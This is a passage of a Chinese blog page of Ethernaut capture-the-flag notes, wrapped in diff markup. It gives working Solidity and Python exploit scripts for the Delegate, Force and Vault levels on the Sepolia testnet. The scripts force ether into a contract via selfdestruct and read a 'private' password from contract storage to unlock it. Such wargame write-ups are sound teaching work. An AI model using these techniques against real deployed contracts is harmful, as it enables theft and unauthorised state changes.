+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Poseidon.Blockchain</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">chain</span> <span class="o">=</span> <span class="n">Chain</span><span class="p">(</span><span class="s2">&#34;https://rpc.sepolia.org&#34;</span><span class="p">)</span>
+<span class="n">account</span> <span class="o">=</span> <span class="n">Account</span><span class="p">(</span><span class="n">chain</span><span class="p">,</span> <span class="s2">&#34;key&#34;</span><span class="p">)</span>
+<span class="n">abi</span><span class="p">,</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="n">BlockchainUtils</span><span class="o">.</span><span class="n">Compile</span><span class="p">(</span><span class="s2">&#34;delegate.sol&#34;</span><span class="p">,</span> <span class="s2">&#34;Delegate&#34;</span><span class="p">)</span>
+<span class="n">contractAddress</span> <span class="o">=</span> <span class="s2">&#34;0xf755Cad7611EF1CacA20A0A67a77c50a36bC8D65&#34;</span>
+<span class="n">contract</span> <span class="o">=</span> <span class="n">Contract</span><span class="p">(</span><span class="n">account</span><span class="p">,</span> <span class="n">contractAddress</span><span class="p">,</span> <span class="n">abi</span><span class="p">)</span>
+
+<span class="n">pwndata</span> <span class="o">=</span> <span class="n">contract</span><span class="o">.</span><span class="n">EncodeABI</span><span class="p">(</span><span class="s2">&#34;pwn&#34;</span><span class="p">)</span>
+<span class="n">account</span><span class="o">.</span><span class="n">SendTransaction</span><span class="p">(</span><span class="n">contract</span><span class="o">.</span><span class="n">Address</span><span class="p">,</span> <span class="n">pwndata</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="force">Force</h2>
+<h3 id="题目-5">题目</h3>
+<p>目的：尝试给合约转账</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="kd">contract</span> <span class="nc">Force</span> <span class="p">{</span><span class="cm">/*
+</span><span class="cm">
+</span><span class="cm">                   MEOW ?
+</span><span class="cm">         /\_/\   /
+</span><span class="cm">    ____/ o o \
+</span><span class="cm">  /~____  =ø= /
+</span><span class="cm"> (______)__m_m)
+</span><span class="cm">
+</span><span class="cm">*/</span><span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="题目分析-5">题目分析</h3>
+<p>考点：合约自毁强制转账</p>
+<ul>
+<li>一个合约如果能通过正常渠道收钱，则要求该合约的 fallback 函数必须是 payable 的（很显然本题并不满足）</li>
+<li>但是合约自毁的时候可以强制把该合约的钱转出</li>
+</ul>
+<h3 id="解题思路-5">解题思路</h3>
+<ul>
+<li>创建一个合约</li>
+<li>给这个合约打一点钱</li>
+<li>触发合约自我销毁，强制转账给 Force 合约</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="kd">contract</span> <span class="nc">Hacker</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="n">instance_addr</span> <span class="o">=</span> <span class="mh">0x0C3C396d9E46cF0f54D65F1C1d98E62D5632686D</span><span class="p">;</span>
+  <span class="n">Force</span> <span class="n">f</span> <span class="o">=</span> <span class="n">Force</span><span class="p">(</span><span class="n">instance_addr</span><span class="p">);</span>
+  <span class="kd">function</span> <span class="nf">hack</span><span class="p">()</span> <span class="k">payable</span> <span class="k">public</span> <span class="p">{}</span>
+  <span class="kd">function</span> <span class="nf">exp</span><span class="p">()</span> <span class="k">payable</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="nb">selfdestruct</span><span class="p">(</span><span class="mh">0x0C3C396d9E46cF0f54D65F1C1d98E62D5632686D</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Poseidon.Blockchain</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">abi</span><span class="p">,</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="n">BlockchainUtils</span><span class="o">.</span><span class="n">Compile</span><span class="p">(</span><span class="s2">&#34;force.sol&#34;</span><span class="p">,</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">=</span> <span class="n">Chain</span><span class="p">(</span><span class="s2">&#34;https://rpc.sepolia.org&#34;</span><span class="p">)</span>
+<span class="n">account</span> <span class="o">=</span> <span class="n">Account</span><span class="p">(</span><span class="n">chain</span><span class="p">,</span> <span class="s2">&#34;key&#34;</span><span class="p">)</span>
+<span class="n">contractAddress</span> <span class="o">=</span> <span class="s2">&#34;0x0C3C396d9E46cF0f54D65F1C1d98E62D5632686D&#34;</span>
+<span class="n">Hacker</span> <span class="o">=</span> <span class="n">account</span><span class="o">.</span><span class="n">DeployContract</span><span class="p">(</span><span class="n">abi</span><span class="p">,</span> <span class="n">bytecode</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">contractAddress</span><span class="p">)[</span><span class="s2">&#34;Contract&#34;</span><span class="p">]</span>
+
+<span class="n">hack</span> <span class="o">=</span> <span class="n">Hacker</span><span class="o">.</span><span class="n">EncodeABI</span><span class="p">(</span><span class="s2">&#34;hack&#34;</span><span class="p">)</span>
+<span class="n">account</span><span class="o">.</span><span class="n">SendTransaction</span><span class="p">(</span><span class="n">Hacker</span><span class="o">.</span><span class="n">Address</span><span class="p">,</span> <span class="n">Data</span><span class="o">=</span><span class="n">hack</span><span class="p">,</span> <span class="n">Value</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">Hacker</span><span class="o">.</span><span class="n">CallFunction</span><span class="p">(</span><span class="s2">&#34;exp&#34;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="vault">Vault</h2>
+<h3 id="题目-6">题目</h3>
+<p>目的：<code>locked == false</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="kd">contract</span> <span class="nc">Vault</span> <span class="p">{</span>
+  <span class="kt">bool</span> <span class="k">public</span> <span class="n">locked</span><span class="p">;</span>
+  <span class="kt">bytes32</span> <span class="k">private</span> <span class="n">password</span><span class="p">;</span>
+
+  <span class="kd">constructor</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_password</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">locked</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">_password</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nf">unlock</span><span class="p">(</span><span class="kt">bytes32</span> <span class="n">_password</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">password</span> <span class="o">==</span> <span class="n">_password</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">locked</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="题目分析-6">题目分析</h3>
+<p>考点：private变量？</p>
+<ul>
+<li>在区块链上，所有的变量一定都是公开透明的。</li>
+<li><code>private</code>只能阻止该变量被其他合约访问，不能阻止该变量被攻击者读取</li>
+</ul>
+<h3 id="解题思路-6">解题思路</h3>
+<p>用<code>Poseidon</code>库中的<code>GetStorage</code>方法读取该变量。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Poseidon.Blockchain</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span>
+<span class="n">abi</span><span class="p">,</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="n">BlockchainUtils</span><span class="o">.</span><span class="n">Compile</span><span class="p">(</span><span class="s2">&#34;vault.sol&#34;</span><span class="p">,</span> <span class="s2">&#34;Vault&#34;</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">=</span> <span class="n">Chain</span><span class="p">(</span><span class="s2">&#34;https://rpc.sepolia.org&#34;</span><span class="p">)</span>
+<span class="n">account</span> <span class="o">=</span> <span class="n">Account</span><span class="p">(</span><span class="n">chain</span><span class="p">,</span> <span class="s2">&#34;key&#34;</span><span class="p">)</span>
+<span class="n">contractAddress</span> <span class="o">=</span> <span class="s2">&#34;0xd94964083e94B04B23f0F4a57beb0363A0982977&#34;</span>
+<span class="n">contract</span> <span class="o">=</span> <span class="n">Contract</span><span class="p">(</span><span class="n">account</span><span class="p">,</span> <span class="n">contractAddress</span><span class="p">,</span> <span class="n">abi</span><span class="p">)</span>
+
+<span class="n">passwd</span> <span class="o">=</span> <span class="n">chain</span><span class="o">.</span><span class="n">GetStorage</span><span class="p">(</span><span class="n">contract</span><span class="o">.</span><span class="n">Address</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+<span class="n">passwd</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">passwd</span><span class="p">[</span><span class="mi">2</span><span class="p">:],</span> <span class="mi">16</span><span class="p">))</span>
+<span class="n">contract</span><span class="o">.</span><span class="n">CallFunction</span><span class="p">(</span><span class="s2">&#34;unlock&#34;</span><span class="p">,</span> <span class="n">passwd</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-11-14</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/blockchain/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://sh11no.github.io/blockchain/" data-title="[BlockChain] Ethernaut做题笔记（更新中）" data-via="Akarexol"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://sh11no.github.io/blockchain/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://sh11no.github.io/blockchain/" data-title="[BlockChain] Ethernaut做题笔记（更新中）" data-web><i class="fab fa-whatsapp fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://sh11no.github.io/blockchain/" data-title="[BlockChain] Ethernaut做题笔记（更新中）"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://sh11no.github.io/blockchain/" data-title="[BlockChain] Ethernaut做题笔记（更新中）"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://sh11no.github.io/blockchain/" data-title="[BlockChain] Ethernaut做题笔记（更新中）" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg"></i></a><a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://sh11no.github.io/blockchain/" data-title="[BlockChain] Ethernaut做题笔记（更新中）" data-description=""><i class="fab fa-blogger fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://sh11no.github.io/blockchain/" data-title="[BlockChain] Ethernaut做题笔记（更新中）"><i class="fab fa-evernote fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/sichuan2022/" class="prev" rel="prev" title="四川省网安技能大赛2022 个人输出复盘"><i class="fas fa-angle-left fa-fw"></i>四川省网安技能大赛2022 个人输出复盘</a>
+            <a href="/hitcon2022/" class="next" rel="next" title="Hitcon2022-Checker Windows驱动文件分析">Hitcon2022-Checker Windows驱动文件分析<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.87.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Shino</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"data":{"id-1":"Shino","id-2":"Shino"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"$$","right":"$$"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"},{"display":false,"left":"$","right":"$"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
